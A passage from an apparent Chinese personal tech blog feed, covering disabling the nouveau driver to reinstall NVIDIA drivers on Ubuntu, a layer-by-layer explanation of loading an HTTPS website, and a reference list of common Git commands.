rho*math.sin(theta)<br><span class="hljs-comment">#坐标变换</span><br>            <span class="hljs-attribute">px</span> = int((p_x-circle_center[<span class="hljs-number">0</span>])*math.cos(inclination)-(p_y-circle_center[<span class="hljs-number">1</span>])*math.sin(inclination)+circle_center[<span class="hljs-number">0</span>])<br>            <span class="hljs-attribute">py</span> = int((p_x-circle_center[<span class="hljs-number">0</span>])*math.sin(inclination)+(p_y-circle_center[<span class="hljs-number">1</span>])*math.cos(inclination)+circle_center[<span class="hljs-number">1</span>])<br>            <br>            <span class="hljs-attribute">black_img</span>[row,col,:] = img[p_y,p_x,:]<br>            <br>    <span class="hljs-attribute">return</span> black_img<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>图像处理</tag>
      
      <tag>极坐标转换</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NVIDIA驱动安装之禁用nouveau</title>
    <link href="/blog/2021/01/05/NVIDIA%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E4%B9%8B%E7%A6%81%E7%94%A8nouveau/"/>
    <url>/blog/2021/01/05/NVIDIA%E9%A9%B1%E5%8A%A8%E5%AE%89%E8%A3%85%E4%B9%8B%E7%A6%81%E7%94%A8nouveau/</url>
    
    <content type="html"><![CDATA[<p>最近实验室的服务器英伟达驱动重启之后就不能用了，查明原因原来是因为Ubuntu自动升级了内核，导致原本的驱动失效了，所以一定不要没事干去升级内核，下面介绍一下重装驱动的曲折之旅。</p><p><img src="/images/fj55.jpg"></p><span id="more"></span><h2 id="0x00更改blacklist（没成功）"><a href="#0x00更改blacklist（没成功）" class="headerlink" title="0x00更改blacklist（没成功）"></a>0x00更改blacklist（没成功）</h2><p>0.备份boot文件</p><p>1.更改conf文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nano /etc/modprobe.d/blacklist.conf<br><span class="hljs-comment">#尾部追加blacklist</span><br>  <span class="hljs-attribute">blacklist</span> nouveau<br>  <span class="hljs-attribute">options</span> nouveau modeset=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>2.重新生成 kernel initramfs:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo update-initramfs -u</span><br></code></pre></td></tr></table></figure><p>3.禁用图形化界面</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">get-default</span><br><span class="hljs-string">graphical</span>.<span class="hljs-string">target</span><br>$ <span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">set-default</span> <span class="hljs-string">multi-user</span>.<span class="hljs-string">target</span><br><span class="hljs-string">Created</span> <span class="hljs-string">symlink</span> /<span class="hljs-string">etc</span>/<span class="hljs-string">systemd</span>/<span class="hljs-string">system</span>/<span class="hljs-string">default</span>.<span class="hljs-string">target</span> → /<span class="hljs-string">lib</span>/<span class="hljs-string">systemd</span>/<span class="hljs-string">system</span>/<span class="hljs-string">multi-user</span>.<span class="hljs-string">target</span>.<br>$ <span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">get-default</span><br><span class="hljs-string">multi-user</span>.<span class="hljs-string">target</span><br></code></pre></td></tr></table></figure><p>4.重启，然后 lsmod  | grep nouveau ，还是有该模块。</p><h2 id="0x01移除nouveau-ko（没成功）"><a href="#0x01移除nouveau-ko（没成功）" class="headerlink" title="0x01移除nouveau.ko（没成功）"></a>0x01移除nouveau.ko（没成功）</h2><p>1.打开&#x2F;lib&#x2F;modules&#x2F;目录</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo <span class="hljs-built_in">find</span> -name ‘nouveau*’<br></code></pre></td></tr></table></figure><p>2.然后将查找到的ko文件重命名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo mv .<span class="hljs-regexp">/4.15.0-117-generic/</span>kernel<span class="hljs-regexp">/drivers/g</span>pu<span class="hljs-regexp">/drm/</span>nouveau<span class="hljs-regexp">/nouveau.ko ./</span><span class="hljs-number">4.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">117</span>-generic<span class="hljs-regexp">/kernel/</span>drivers<span class="hljs-regexp">/gpu/</span>drm<span class="hljs-regexp">/nouveau/</span>nouveau.ko.bkp<br><br>sudo mv .<span class="hljs-regexp">/4.15.0-128-generic/</span>kernel<span class="hljs-regexp">/drivers/g</span>pu<span class="hljs-regexp">/drm/</span>nouveau<span class="hljs-regexp">/nouveau.ko ./</span><span class="hljs-number">4.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">128</span>-generic<span class="hljs-regexp">/kernel/</span>drivers<span class="hljs-regexp">/gpu/</span>drm<span class="hljs-regexp">/nouveau/</span>nouveau.ko.bkp<br><br></code></pre></td></tr></table></figure><p>3.重新生成 kernel initramfs:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo update-initramfs -u</span><br></code></pre></td></tr></table></figure><p>4.重启，然后 lsmod  | grep nouveau ，还是有该模块。失败</p><h2 id="0x02配置grub禁用启动项"><a href="#0x02配置grub禁用启动项" class="headerlink" title="0x02配置grub禁用启动项"></a>0x02配置grub禁用启动项</h2><p>最后迫于尝试了查到的方法都不是很靠谱，咨询了一下开源社区的学长们，给出了解决方案成功了，此时还是处于level3文字界面的。</p><p>1.增加内核参数禁用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo nano <span class="hljs-regexp">/etc/</span>default/grub<br><span class="hljs-comment">#增加modprobe.blacklist=nouveau</span><br>GRUB_CMDLINE_LINUX_DEFAULT=<span class="hljs-string">&quot;modprobe.blacklist=nouveau&quot;</span><br></code></pre></td></tr></table></figure><p>modprobe用于向Linux Kernel添加 或 移除 kernel modules。 kernel modules以.ko作为扩展名。 </p><p>这里是增加了一个黑名单，在grub时禁用掉该模块。</p><p>2.重新新生成配置</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo grub-<span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p>注：2022.11.14更新说明，根据“阿离”同学反馈，更新grub配置应当使用以下命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo update-grub</span><br></code></pre></td></tr></table></figure><p>3.重启后 lsmod  | grep nouveau便发现没有了这个模块，然后成功安装了英伟达的驱动。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>据学长所说，好像新内核是builtin的了，所以需要在grub里边禁用，对Linux的学习之路任重道远啊！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux kernel</tag>
      
      <tag>NVIDIA driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>访问一个https协议的网站背后的故事</title>
    <link href="/blog/2020/11/18/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AAhttps%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%95%85%E4%BA%8B/"/>
    <url>/blog/2020/11/18/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AAhttps%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%95%85%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<p><strong>或许我们知道访问一个网站背后大概发生了什么，比如DNS解析、TLS连接建立、路由、服务器响应、浏览器解析超文本数据等等，但是要是详细的说明以下的话还是不能够理得很清楚，因此整理记录一下备忘</strong></p><p><img src="/images/fj59.jpg"></p><span id="more"></span><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="浏览器输入URL"><a href="#浏览器输入URL" class="headerlink" title="浏览器输入URL"></a>浏览器输入URL</h3><p>比如在浏览器地址栏输入<a href="https://chujian521.github.io/about/#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99Blog%EF%BC%9F%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E8%A7%A3%E6%9E%90URL%E5%B9%B6%E5%BC%80%E5%A7%8B%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E3%80%82URL%E4%B8%80%E8%88%AC%E5%8C%85%E6%8B%AC%E4%BB%A5%E4%B8%8B%E9%83%A8%E5%88%86%EF%BC%9A">https://chujian521.github.io/about/#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%86%99Blog%EF%BC%9F，浏览器会解析URL并开始网络请求。URL一般包括以下部分：</a></p><ul><li>protocol：使用的协议，这里是https</li><li>host：主机名，这里是chujian521.github.io</li><li>port：端口号，一般https的默认端口号为443</li><li>path：请求资源路径，这里示例的path为 about&#x2F;</li><li>query：查询参数，这里为空，一般出现的在path之后的 ?k&#x3D;v</li><li>fragment： 主要是用来标识资源里的某个资源，比如例子里的 #后面的部分</li></ul><h3 id="DNS解析主机名"><a href="#DNS解析主机名" class="headerlink" title="DNS解析主机名"></a>DNS解析主机名</h3><p>DNS(Domain Name Service)就是一种将网站主机名转换成网络世界的ip地址的一种服务，人类容易记住有含义的名字，但是在网络中路由器使用的是固定化结构的IP地址，因此人就设计了这种主机名到IP地址的映射服务。</p><p>DNS的解析大概有以下过程：</p><ul><li>浏览器检查自身缓存，查找是否解析过这个域名，如果有使用缓存，解析结束，如果没有进入下一步</li><li>检查操作系统的域名缓存，比如hosts文件中用户自定义的一些解析规则，如果有浏览器就会使用，没有进入下一步</li><li>请求本地域名服务器解析，大部分网站在这里已经被解析，如果没有进入下一步</li><li>本地域名服务器请求根域名服务器，根域名返回一个查询域的主域名服务器（.com, .cn, .org等），本地域名服务器根据查询到的主域名服务器向主域名服务器发送查询请求，主域名服务器查询域名对应的网站注册域名服务器，找到对应IP地址，返回给本地域名服务器，本地域名服务器缓存这个域名对应的ip，然后把解析结果返回用户。</li></ul><p>DNS请求和回答报文的下层都是使用UDP数据报经过53端口发送的。</p><h3 id="生成HTTP报文"><a href="#生成HTTP报文" class="headerlink" title="生成HTTP报文"></a>生成HTTP报文</h3><h4 id="客户端请求报文"><a href="#客户端请求报文" class="headerlink" title="客户端请求报文"></a>客户端请求报文</h4><p><strong>基础结构：</strong></p><ul><li>请求行：请求方法 请求资源地址 HTTP版本 CRLF换行符，示例 <code>GET /about/ HTTP1.1 \r\n</code></li><li>请求头：key: value CRLF换行符</li><li>空行，标识请求头结束</li><li>请求主体：即请求正文，POST会使用，GET方式没有这部分</li></ul><p><strong>请求头：</strong></p><ul><li>Accept：可接受的响应内容类型</li><li>Accept-Charset：可接受的字符集</li><li>Accept-Encoding：可接受的响应内容编码方式</li><li>Accept-Language：可接受的响应内容语言列表</li><li>Authorization：用于表示HTTP协议中需要认证资源的认证信息（Basic认证是不安全的）</li><li>Cache-Control：用来指定当前的请求&#x2F;回复中的，是否使用缓存机制</li><li>Connection：客户端（浏览器）想要优先使用的连接类型</li><li>Cookie：由之前服务器通过<code>Set-Cookie</code>设置的（或者客户端产生的Cookie）一个HTTP协议Cookie</li><li>Content-Length：十进制数字表示的八位字节的数字长度的请求体</li><li>Content-Type：请求体的MIME类型 （用于POST和PUT请求中）</li><li>Origin：会在跨域请求时带上，服务端据此判断是否允许跨域</li><li>Referer：表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面</li><li>User-Agent：浏览器的身份标识字符串</li><li>X-Forwarded-For：用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</li></ul><h4 id="服务器响应报文"><a href="#服务器响应报文" class="headerlink" title="服务器响应报文"></a>服务器响应报文</h4><p><strong>基础结构：</strong></p><ul><li>响应行：HTTP版本 状态码 状态码文本描述 CRLF换行符，示例<code>HTTP 200 OK</code></li><li>响应头：key: value CRLF换行符</li><li>空行，标识响应头结束</li><li>响应主体</li></ul><p><strong>响应头：</strong></p><ul><li>Access-Control-Allow-Origin：指定哪些网站可以跨域源资源共享</li><li>Allow：对于特定资源的有效动作</li><li>Cache-Control： 通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒</li><li>Connection：针对该连接的预期</li><li>Content-Encoding：响应资源所使用的编码类型</li><li>Content-Language：响应使用的语言</li><li>Content-Length：响应消息体的长度，十进制数字表示的八位字节的数字</li><li>Date：消息被发送的时间</li><li>ETag：对于某个资源的某个特定版本的一个标识符，通常是一个消息散列</li><li>Expires：响应过期时间</li><li>Location：用于在进行重定向</li><li>Refresh：用于重定向，默认5秒后刷新重定向</li><li>Server：服务器名称</li><li>Set-Cookie：设置http cookie</li><li>Status：响应状态</li><li>Vary：告知下游的代理服务器，应当如何对以后的请求协议头进行匹配，以决定是否可使用已缓存的响应内容而不是重新从原服务器请求新的内容</li><li>x-xss-protection：当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面</li></ul><p>HTTP消息头支持自定义， 自定义的专用消息头一般会添加<code>&#39;X-&#39;</code>前缀。</p><p>http常见响应状态：</p><ul><li>200 请求成功</li><li>206 Partial Content 服务器已经处理了部分GET请求，可用来实现断点续传或大文档分解为多个段下载</li><li>301 永久重定向，请求的资源已经永久移动到新的位置</li><li>302 临时重定向，请求资源临时从不同的URI响应请求</li><li>304 未修改，GET请求资源未改变</li><li>400 错误的请求，请求语义或者参数有误</li><li>401 未授权，当前请求需要用户验证</li><li>403 禁止访问，服务器理解请求，但是拒绝执行</li><li>404 未找到，请求的资源未在服务器发现</li><li>405 方法不被允许，请求中指定的方法不能用于请求相应的资源</li><li>500 服务器错误，无法完成对请求的处理</li><li>502 无效网关，作为网关或者代理服务器尝试执行请求时，从上游服务器接收到无效的响应</li><li>503 服务不可达，由于临时的服务器维护或者过载，服务器当前无法处理请求</li><li>504 网关超时，网关或者代理服务器执行请求时未能及时从上游服务器收到响应</li></ul><h3 id="HTTP-1-0-x2F-1-1-x2F-2-0版本有什么不同？"><a href="#HTTP-1-0-x2F-1-1-x2F-2-0版本有什么不同？" class="headerlink" title="HTTP 1.0&#x2F;1.1&#x2F;2.0版本有什么不同？"></a>HTTP 1.0&#x2F;1.1&#x2F;2.0版本有什么不同？</h3><p>HTTP1.0默认使用 <code>Connection:close</code>，浏览器每次请求都需要与服务器建立一个 TCP 连接，服务器处理完成后立即断开 TCP 连接（无连接），服务器不跟踪每个客户端也不记录过去的请求（无状态）。</p><p>HTTP1.1默认使用 <code>Connection:keep-alive</code>（<strong>长连接</strong>），避免了连接建立和释放的开销；通过 Content-Length 字段来判断当前请求的数据是否已经全部接受；HTTP1.1也可以多建立几个TCP连接，来支持处理更多并发的请求，但是创建TCP连接本身也是有开销的，并且有上上限限制；支持断点续传；共用TCP连接，但是请求是串行的，第二个请求只有子啊第一个请求结束后才能发送。</p><p>HTTP2.0使用了多路复用的技术，做到同一个连接并发处理多个请求，而且并发请求的数量比HTTP1.1大了好几个数量级。HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，<strong>通讯双方各自cache一份header fields表</strong>，既避免了重复header的传输，又减小了需要传输的大小。HTTP2.0引入了server push，它允许服务端推送资源给浏览器，在浏览器明确地请求之前，免得客户端再次创建连接发送请求到服务器端获取。这样客户端可以直接从本地加载这些资源，不用再通过网络。</p><p>HTTP3.0的底层支撑协议QUIC基于UDP实现，又含TCP的特点，实现了又快又可靠的协议。</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="TLS加密"><a href="#TLS加密" class="headerlink" title="TLS加密"></a>TLS加密</h3><p>TLS可以提供数据的完整性和保密性，最常用的TLS1.2协商过程如下：</p><ul><li>ClientHello，客户端表示想跟服务端安全进行通信，生成随机数R1和自己支持的加密算法发送给服务器</li><li>ServerHello，服务器收到，生成随机数R2，选择一种双方支持的加密算法，并返回给客户端自己的证书、随机数R2、会话密钥生成算法。</li><li>Certificate Verify：客户端验证证书的真实性，如果有误发出警告并断开链接，如果无误客户端就会生成随机数R3，根据会话秘钥算法使用R1、R2、R3生成会话秘钥，用服务器证书公钥加密随机数R3并发送给服务端。</li><li>Server Finish：服务器用私钥解密客户端发过来的随机数R3，根据会话秘钥算法使用R1、R2、R3生成会话秘钥，后面就可以使用会话密钥进行数据安全传输。</li></ul><p>为什么要使用三个随机数呢？</p><ol><li>增强伪随机数的随机性</li><li>防止报文被重放</li></ol><p>为什么要发送一个Finish报文？</p><ol><li>校验双方的身份，双方可以验证彼此是否为即将进行通信的对象</li></ol><h3 id="TCP连接建立解除"><a href="#TCP连接建立解除" class="headerlink" title="TCP连接建立解除"></a>TCP连接建立解除</h3><h4 id="三次握手（建立连接）"><a href="#三次握手（建立连接）" class="headerlink" title="三次握手（建立连接）"></a>三次握手（建立连接）</h4><p>第一次握手：客户端给服务端发一个 SYN 报文和初始序列号，此时客户端处于 SYN_Send状态。</p><p>第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，并且也是指定了自己的初始化序列号，同时会把客户端的 ISN + 1 作为 ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD的状态</p><p>第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，当然，也是一样把服务器的初始化序列号 + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，此时客户端处于 establised状态。服务器收到 ACK 报文之后，也处于 establised 状态，此时，双方以建立起了连接。</p><h4 id="四次挥手（释放连接，访问结束后）"><a href="#四次挥手（释放连接，访问结束后）" class="headerlink" title="四次挥手（释放连接，访问结束后）"></a>四次挥手（释放连接，访问结束后）</h4><p>第一次挥手：客户端发送一个FIN，用来关闭客户到服务器的数据传送。 </p><p>第二次挥手：服务器收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 </p><p>第三次挥手：服务器关闭与客户端的连接，发送一个FIN给客户端。 </p><p>第四次挥手：客户端发回ACK报文确认，并将确认序号设置为收到序号加1。</p><h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p>建立连接后数据传输就会通过传输层进行分包传输，TCP拥有流量控制和拥塞控制。采用滑动窗口机制实现流量控制，采用慢启动、拥塞避免、快重传、快恢复等机制实现拥塞控制。</p><p><img src="/images/tcp-yskz.png"></p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="NAT网络地址转换"><a href="#NAT网络地址转换" class="headerlink" title="NAT网络地址转换"></a>NAT网络地址转换</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>NAT技术可以让在专用网内拥有本地IP的主机通过装有NAT软件的路由器连接到因特网上能和外界通信的技术，借助于NAT技术,私有(保留)IP地址的”内部”网络通过路由器发送数据包时,私有地址被转换成合法的公有IP地址,而一个局域网只需使用少量公有IP地址(甚至是1个)即可实现私有地址网络内所有计算机与Internet的通信需求。</p><h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><ol><li><p>静态转换Static NAT：私有IP转公有IP，IP地址一对一，即某一私有IP只能转为某一公有IP。</p></li><li><p>动态转换Dynamic NAT：私有IP转公有IP,转换的公有IP地址不确定。</p></li><li><p>端口多路复用OverLoad：所有内部网络的主机均可共享一个合法外部IP地址实现对Internet的访问。不仅可以最大限度地节约IP地址资源,同时,又可隐藏网络内部的所有主机，有效避免来自internet的攻击。</p></li></ol><h3 id="IP寻址"><a href="#IP寻址" class="headerlink" title="IP寻址"></a>IP寻址</h3><p>网络层负责把传输层封装的数据包在路由器之间传输，最终到达目的地址，根据目的地址IP就需要查找下一跳路由的地址。</p><p>查找过程如下：</p><ul><li>根据目的地址，判断是否处于同一内网，如果处于同一内网直接发送</li><li>如果不是，查询路由表，找到路由，如果找不到明确的路由，就将数据传送给默认网关地址。</li><li>路由器收到数据后，它再次为远程主机或网络查询路由，若还未找到路由，该数据包将发送到该路由器的缺省网关地址。而数据包中包含一个最大路由跳数（RIP路由协议），如果超过这个跳数，就会丢弃数据包，这样可以防止无限传递。路由器收到数据包后，只会查看网络层的封包数据。</li><li>如果上面的步骤无法完成，那么该数据就无法传送，会向生成数据报文的应用程序返回一个网络不可达的错误信息。</li></ul><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>ARP协议是将IP地址映射成硬件设备的MAC地址的。</p><p>寻找过程：</p><ul><li>发送源MAC地址为全FF的广播报文，此时广播域内所有设备都能收到这个请求。</li><li>对应要查找的IP的设备收到报文之后，将发送者MAC地址缓存之后回复发送者自己的MAC地址。</li></ul><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><h3 id="MAC寻址"><a href="#MAC寻址" class="headerlink" title="MAC寻址"></a>MAC寻址</h3><p>首先通过广播获取足够的MAC地址表，交换机使用MAC地址通过指向相应端口的交换结构将网络通信转向目的节点。交换机为了知道要使用哪个端口来传送单播帧，它必须首先知道自己的每个端口上都存在哪些节点。</p><p>交换机使用其 MAC 地址表来确定如何处理传入的数据帧。通过记录与其每一个端口相连的节点的 MAC 地址来构建其 MAC 地址表。当某个特定端口上的某个特定节点的 MAC 地址记录到地址表之后，交换机就可以知道在后续传输中，应将目的地为该特定节点的流量从与该节点对应的端口上发出。</p><p>当交换机收到传入的数据帧，而地址表中没有该帧的目的MAC地址时，交换机将把该帧从除接收该帧的端口之外的所有端口转发出去。当目的节点响应时，交换机从响应帧的源地址字段中获得的该节点的MAC地址，并将其记录在地址表中。</p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>通过光纤等物理设备传输网络信号。</p><h2 id="服务器收到请求"><a href="#服务器收到请求" class="headerlink" title="服务器收到请求"></a>服务器收到请求</h2><h3 id="反向代理服务器"><a href="#反向代理服务器" class="headerlink" title="反向代理服务器"></a>反向代理服务器</h3><p>大型的网站都有负载均衡，流量到达反向代理服务器之后，由反向代理服务器执行调度算法，分配给不同的服务器处理请求。</p><p>服务器经过层层解封装，最终会得到原始的http请求。</p><h3 id="服务器处理请求"><a href="#服务器处理请求" class="headerlink" title="服务器处理请求"></a>服务器处理请求</h3><h4 id="资源请求"><a href="#资源请求" class="headerlink" title="资源请求"></a>资源请求</h4><p>对于普通的静态资源请求，大型网站通常采用内容分发网络处理。内容分发网络（Content Delivery Network，简称CDN）是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。CDN应用广泛，支持多种行业、多种场景内容加速，例如：图片小文件、大文件下载、视音频点播、直播流媒体、全站加速、安全加速。</p><p>只需将其域名的解析权交给CDN的负载均衡设备，CDN负载均衡设备将为用户选择一台合适的缓存服务器，用户通过访问这台缓存服务器来获取自己所需的数据。</p><h4 id="其他请求"><a href="#其他请求" class="headerlink" title="其他请求"></a>其他请求</h4><ol><li>后台服务器处理请求，一般要先进行验证，比如安全拦截、跨域验证等等，如果不符合安全验证，直接返回拒绝的http报文</li><li>验证通过后进行请求相应的操作，比如查询、修改、或者计算数据</li><li>执行完毕生成http相应包返回给客户端</li></ol><h2 id="浏览器处理响应"><a href="#浏览器处理响应" class="headerlink" title="浏览器处理响应"></a>浏览器处理响应</h2><h3 id="解析HTML，构建DOM树"><a href="#解析HTML，构建DOM树" class="headerlink" title="解析HTML，构建DOM树"></a>解析HTML，构建DOM树</h3><p>HTML文档会被解析成一棵以document为根的DOM树，解析过程中如果遇到JavaScript，则会暂停解析并传输下载相应的文件造成阻塞。</p><h3 id="构建CSS"><a href="#构建CSS" class="headerlink" title="构建CSS"></a>构建CSS</h3><p>浏览器根据外部样式，内部样式和内联样式来解析CSS，构建CSSSOM树。</p><h3 id="构建渲染树和布局"><a href="#构建渲染树和布局" class="headerlink" title="构建渲染树和布局"></a>构建渲染树和布局</h3><p>DOM树和CSSOM树构建完毕后会融合成渲染树，然后浏览器会确认页面各元素的位置。</p><h3 id="页面绘制和优化"><a href="#页面绘制和优化" class="headerlink" title="页面绘制和优化"></a>页面绘制和优化</h3><p>浏览器根据布局结果进行页面的绘制，并优化页面内容，减小CPU消耗。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Git的使用</title>
    <link href="/blog/2020/09/19/Git%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/blog/2020/09/19/Git%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>闲着也是闲着，学习一下程序员必备工具Git的使用方法吧。</p><p><img src="/images/fj54.jpg"></p><span id="more"></span><h2 id="简易指南"><a href="#简易指南" class="headerlink" title="简易指南"></a>简易指南</h2><p><a href="https://www.bootcss.com/p/git-guide/">https://www.bootcss.com/p/git-guide/</a></p><h2 id="ProGit"><a href="#ProGit" class="headerlink" title="ProGit"></a>ProGit</h2><p><a href="https://www.progit.cn/">https://www.progit.cn/</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>Git常用操作命令：</p><ol><li>远程仓库相关命令</li></ol><p>检出仓库：$ git clone git:&#x2F;&#x2F;github.com&#x2F;jquery&#x2F;jquery.git</p><p>查看远程仓库：$ git remote -v</p><p>添加远程仓库：$ git remote add [name] [url]</p><p>删除远程仓库：$ git remote rm [name]</p><p>修改远程仓库：$ git remote set-url –push [name] [newUrl]</p><p>拉取远程仓库：$ git pull [remoteName] [localBranchName]</p><p>推送远程仓库：$ git push [remoteName] [localBranchName]</p><p>*如果想把本地的某个分支test提交到远程仓库，并作为远程仓库的master分支，或者作为另外一个名叫test的分支，如下：</p><p>$git push origin test:master         &#x2F;&#x2F; 提交本地test分支作为远程的master分支</p><p>$git push origin test:test              &#x2F;&#x2F; 提交本地test分支作为远程的test分支</p><p>2）分支(branch)操作相关命令</p><p>查看本地分支：$ git branch</p><p>查看远程分支：$ git branch -r</p><p>创建本地分支：$ git branch [name] —-注意新分支创建后不会自动切换为当前分支</p><p>切换分支：$ git checkout [name]</p><p>创建新分支并立即切换到新分支：$ git checkout -b [name]</p><p>删除分支：$ git branch -d [name] —- -d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项</p><p>合并分支：$ git merge [name] —-将名称为[name]的分支与当前分支合并</p><p>创建远程分支(本地分支push到远程)：$ git push origin [name]</p><p>删除远程分支：$ git push origin :heads&#x2F;[name] 或 $ gitpush origin :[name] </p><p>*创建空的分支：(执行命令之前记得先提交你当前分支的修改，否则会被强制删干净没得后悔)</p><p>$git symbolic-ref HEAD refs&#x2F;heads&#x2F;[name]</p><p>$rm .git&#x2F;index</p><p>$git clean -fdx</p><p>3）版本(tag)操作相关命令</p><p>查看版本：$ git tag</p><p>创建版本：$ git tag [name]</p><p>删除版本：$ git tag -d [name]</p><p>查看远程版本：$ git tag -r</p><p>创建远程版本(本地版本push到远程)：$ git push origin [name]</p><p>删除远程版本：$ git push origin :refs&#x2F;tags&#x2F;[name]</p><p>合并远程仓库的tag到本地：$ git pull origin –tags</p><p>上传本地tag到远程仓库：$ git push origin –tags</p><p>创建带注释的tag：$ git tag -a [name] -m ‘yourMessage’</p><ol start="4"><li>子模块(submodule)相关操作命令</li></ol><p>添加子模块：$ git submodule add [url] [path]</p><p>   如：$git submodule add git:&#x2F;&#x2F;github.com&#x2F;soberh&#x2F;ui-libs.git src&#x2F;main&#x2F;webapp&#x2F;ui-libs</p><p>初始化子模块：$ git submodule init  —-只在首次检出仓库时运行一次就行</p><p>更新子模块：$ git submodule update —-每次更新或切换分支后都需要运行一下</p><p>删除子模块：（分4步走哦）</p><ol><li><p>$ git rm –cached [path]</p></li><li><p>编辑“.gitmodules”文件，将子模块的相关配置节点删除掉</p></li><li><p>编辑“ .git&#x2F;config”文件，将子模块的相关配置节点删除掉</p></li><li><p>手动删除子模块残留的目录</p></li></ol><p>5）忽略一些文件、文件夹不提交</p><p>在仓库根目录下创建名称为“.gitignore”的文件，写入不需要的文件夹名或文件，每个元素占一行即可，如</p><p>target</p><p>bin</p><p>*.db</p><h3 id="Git命令参考手册-文本版"><a href="#Git命令参考手册-文本版" class="headerlink" title="Git命令参考手册(文本版)"></a>Git命令参考手册(文本版)</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 